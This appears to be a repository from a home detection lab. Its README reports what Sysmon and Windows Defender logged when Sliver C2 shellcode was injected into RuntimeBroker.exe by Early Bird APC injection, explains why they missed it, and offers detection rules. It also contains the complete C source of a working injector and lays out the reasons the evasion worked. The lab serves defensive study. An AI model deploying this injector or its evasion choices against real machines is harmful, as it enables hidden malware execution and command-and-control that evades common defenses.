@@ -1,0 +1,233 @@
+Project Path: arc_jfisay_earlybird-detection-lab_t14u_83z
+
+Source Tree:
+
+```txt
+arc_jfisay_earlybird-detection-lab_t14u_83z
+├── README.md
+└── src
+    └── earlybird.c
+
+```
+
+`README.md`:
+
+```md
+# Early Bird APC Injection: What Sysmon and Defender Actually See
+
+A hands-on detection engineering lab exploring Early Bird APC injection (MITRE ATT&CK [T1055.004](https://attack.mitre.org/techniques/T1055/004/)). I injected Sliver C2 shellcode into RuntimeBroker.exe and tested what Sysmon and Windows Defender detect at each stage.
+
+**Result:** Sysmon logged 2 out of 5 expected events. Defender with current signatures and cloud protection caught zero stages of the attack.
+
+## The technique
+
+Early Bird injection spawns a legitimate Windows process in a suspended state, writes shellcode into it, and queues an Asynchronous Procedure Call (APC) on the suspended thread. When the thread resumes, the APC fires *before the process entry point* — before DLLs load, before EDR hooks install.
+
+```
+CreateProcessA("RuntimeBroker.exe", CREATE_SUSPENDED)
+    → VirtualAllocEx(PAGE_EXECUTE_READWRITE)
+    → WriteProcessMemory(shellcode)
+    → QueueUserAPC(shellcode_addr, hThread)
+    → ResumeThread(hThread)
+    → Injector exits. C2 lives in RuntimeBroker.exe.
+```
+
+No new thread is created. Sysmon ID 8 (CreateRemoteThread) never fires. The C2 traffic comes from a trusted Windows binary.
+
+## Lab setup
+
+| Role | Details |
+|------|---------|
+| Attacker | Kali Linux, Sliver C2 with HTTPS listener |
+| Target | Windows LTSC 2024, Sysmon (SwiftOnSecurity config), Defender ON |
+| Network | Isolated virtual network, no internet (except for one Defender update test) |
+| Shellcode | Sliver beacon, `--format shellcode` (~37 MB raw .bin) |
+| Injector | Custom C, 81 lines, compiled with MinGW ([source](src/earlybird.c)) |
+
+## Sysmon results
+
+| Sysmon Event | What it would show | Result |
+|---|---|---|
+| ID 1 (Process Create) | Injector process started | **LOGGED** |
+| ID 1 (Process Create) | RuntimeBroker.exe with injector as parent | **LOGGED** |
+| ID 8 (CreateRemoteThread) | Injection into remote process | **ABSENT** |
+| ID 10 (ProcessAccess) | Injector opening target's memory | **ABSENT** |
+| ID 3 (NetworkConnect) | C2 traffic to attacker | **ABSENT** |
+
+### What the logged events reveal
+
+The RuntimeBroker.exe process creation event contained three detection clues:
+
+```
+Image:            C:\Windows\System32\RuntimeBroker.exe
+CurrentDirectory: C:\lab\                          ← should be C:\WINDOWS\system32\
+ParentImage:      C:\lab\earlybird.exe             ← should be svchost.exe
+```
+
+The injector had blank PE metadata (no FileVersion, Description, Product, Company, or OriginalFileName) — a red flag for custom-compiled binaries.
+
+### Why three events were absent
+
+- **ID 8 (CreateRemoteThread):** APC injection never calls `CreateRemoteThread`. It queues work on the existing suspended thread. This is the primary evasion — many detection rules key on ID 8 as *the* injection signal.
+
+- **ID 10 (ProcessAccess):** The SwiftOnSecurity config filters ProcessAccess aggressively to reduce noise. The specific access rights used fell below the configured threshold.
+
+- **ID 3 (NetworkConnect):** The SwiftOnSecurity config *excludes* RuntimeBroker.exe from network monitoring because it's a noisy legitimate process. The C2 traffic inherited this exclusion. The attacker's choice of target process directly defeated network detection.
+
+## Defender results
+
+Three test runs, escalating Defender's capabilities each time:
+
+| Run | Defender state | Detections |
+|---|---|---|
+| 1 | Directory exclusion (Sysmon-only test) | Excluded |
+| 2 | No exclusion, stale signatures | **0** |
+| 3 | No exclusion, current signatures (v1.463.163.0), cloud protection ON | **0** |
+
+Run 3 is the significant one. I gave the target internet access, updated signatures, confirmed cloud protection (MAPS) was active, re-downloaded fresh files, and ran the injection. Every stage — file on disk, execution, injection, shellcode running, C2 check-in — was invisible.
+
+For context: in a previous lab exercise, the same Defender installation caught a stock Sliver beacon EXE immediately on execution. The difference: that was a compiled PE binary with recognizable Sliver artifacts. The Early Bird injector is clean custom C calling legitimate APIs, and the payload is raw shellcode with no PE structure.
+
+### Why Defender missed it
+
+1. **The injector isn't malware by signature.** CreateProcess, VirtualAllocEx, WriteProcessMemory, QueueUserAPC are APIs used by debuggers and legitimate tools.
+2. **Raw shellcode has no PE structure.** Defender's static scanner looks for PE headers, imports, and known byte patterns. Raw x86 instructions have none of these landmarks.
+3. **AMSI doesn't cover raw shellcode.** AMSI hooks into PowerShell, VBScript, JScript, and .NET — not machine code written via WriteProcessMemory.
+4. **Early Bird timing defeats userland hooks.** Defender patches ntdll.dll in new processes to intercept calls. The APC fires before the entry point — before those hooks install.
+5. **No behavioral trigger.** Even with current signatures and cloud analysis, the injection API sequence wasn't flagged.
+
+## Detection guidance
+
+### 1. Parent-child process relationships (strongest signal)
+RuntimeBroker.exe should be spawned by svchost.exe — never by an unsigned binary. Write detection rules for system processes (RuntimeBroker, dllhost, backgroundTaskHost) with unexpected parents.
+
+### 2. Sysmon config hardening
+The SwiftOnSecurity config's exclusions created blind spots. Targeted additions can close them:
+- Log **ID 3** for RuntimeBroker.exe connecting to non-Microsoft IPs
+- Log **ID 10** with GrantedAccess masks including `PROCESS_VM_WRITE` (0x0020) targeting system processes
+
+### 3. Don't rely on Sysmon ID 8 alone
+APC injection, thread hijacking, atom bombing, and other techniques never trigger CreateRemoteThread. Layer detection across ID 1 (parent-child), ID 10 (memory access), and ID 3 (network).
+
+### 4. Missing PE metadata
+Flag executables with entirely blank FileVersion/Description/Product/Company fields, especially when they spawn system processes.
+
+### 5. Kernel-level EDR
+Sysmon and Defender operate from userland. Early Bird exploits the gap before userland hooks install. Kernel-level EDR (CrowdStrike, SentinelOne, Elastic Defend) uses kernel callbacks and ETW providers that see the injection from the OS level, where the timing trick doesn't apply.
+
+## Key takeaway
+
+Early Bird APC injection is a technique-based attack against signature-based defenses. A custom injector calling legitimate Windows APIs + raw shellcode with no PE structure + a target process excluded from monitoring = invisible at every layer, including Sysmon with SwiftOnSecurity config and Defender with current signatures and cloud protection.
+
+The only reliable signals were in Sysmon ID 1: the wrong parent, the wrong working directory, the blank PE metadata. If you're writing detection rules, start there.
+
+## Files
+
+- [`src/earlybird.c`](src/earlybird.c) — The injector source (81 lines)
+
+## Disclaimer
+
+All testing was performed on owned, isolated virtual machines in a home lab for educational purposes. No traffic left the lab environment. The Early Bird technique is publicly documented (Cyberbit, 2018) and cataloged in MITRE ATT&CK as T1055.004.
+
+```
+
+`src/earlybird.c`:
+
+```c
+/*
+ * Early Bird APC Injection — detection lab tool.
+ *
+ * Spawns a suspended process, writes shellcode via APC, resumes.
+ * For use in isolated lab environments only.
+ *
+ * Compile (cross-compile from Linux):
+ *   x86_64-w64-mingw32-gcc -O2 -o earlybird.exe earlybird.c -lkernel32
+ *
+ * Usage:
+ *   earlybird.exe <shellcode.bin> [target_exe]
+ *   target_exe defaults to C:\Windows\System32\RuntimeBroker.exe
+ */
+
+#include <windows.h>
+#include <stdio.h>
+
+int main(int argc, char *argv[]) {
+    if (argc < 2) {
+        printf("Usage: %s <shellcode.bin> [target_exe]\n", argv[0]);
+        return 1;
+    }
+
+    const char *sc_path = argv[1];
+    const char *target  = argc > 2 ? argv[2]
+                          : "C:\\Windows\\System32\\RuntimeBroker.exe";
+
+    /* ---- 0. Read shellcode from disk ---- */
+    HANDLE hFile = CreateFileA(sc_path, GENERIC_READ, 0, NULL,
+                               OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("[-] Cannot open %s (%lu)\n", sc_path, GetLastError());
+        return 1;
+    }
+    DWORD sc_len = GetFileSize(hFile, NULL);
+    LPVOID sc_buf = VirtualAlloc(NULL, sc_len, MEM_COMMIT, PAGE_READWRITE);
+    DWORD nread;
+    ReadFile(hFile, sc_buf, sc_len, &nread, NULL);
+    CloseHandle(hFile);
+    printf("[+] Shellcode: %lu bytes from %s\n", sc_len, sc_path);
+
+    /* ---- 1. Create suspended process ---- */
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    if (!CreateProcessA(target, NULL, NULL, NULL, FALSE,
+                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
+                        NULL, NULL, &si, &pi)) {
+        printf("[-] CreateProcess failed (%lu)\n", GetLastError());
+        return 1;
+    }
+    printf("[+] Spawned %s  PID=%lu  TID=%lu (SUSPENDED)\n",
+           target, pi.dwProcessId, pi.dwThreadId);
+
+    /* ---- 2. Allocate RWX in remote process ---- */
+    LPVOID remote = VirtualAllocEx(pi.hProcess, NULL, sc_len,
+                                   MEM_COMMIT | MEM_RESERVE,
+                                   PAGE_EXECUTE_READWRITE);
+    if (!remote) {
+        printf("[-] VirtualAllocEx failed (%lu)\n", GetLastError());
+        TerminateProcess(pi.hProcess, 1);
+        return 1;
+    }
+    printf("[+] Allocated %lu bytes at %p in PID %lu\n",
+           sc_len, remote, pi.dwProcessId);
+
+    /* ---- 3. Write shellcode ---- */
+    SIZE_T written;
+    WriteProcessMemory(pi.hProcess, remote, sc_buf, sc_len, &written);
+    printf("[+] Wrote %llu bytes\n", (unsigned long long)written);
+
+    /* ---- 4. Queue APC on the suspended thread ---- */
+    if (!QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0)) {
+        printf("[-] QueueUserAPC failed (%lu)\n", GetLastError());
+        TerminateProcess(pi.hProcess, 1);
+        return 1;
+    }
+    printf("[+] APC queued on TID %lu\n", pi.dwThreadId);
+
+    /* ---- 5. Resume — APC fires before entry point ---- */
+    ResumeThread(pi.hThread);
+    printf("[+] Thread resumed. Shellcode executing in PID %lu\n",
+           pi.dwProcessId);
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    VirtualFree(sc_buf, 0, MEM_RELEASE);
+
+    printf("[*] Injector exiting. C2 lives in %s (PID %lu)\n",
+           target, pi.dwProcessId);
+    return 0;
+}
+
+```
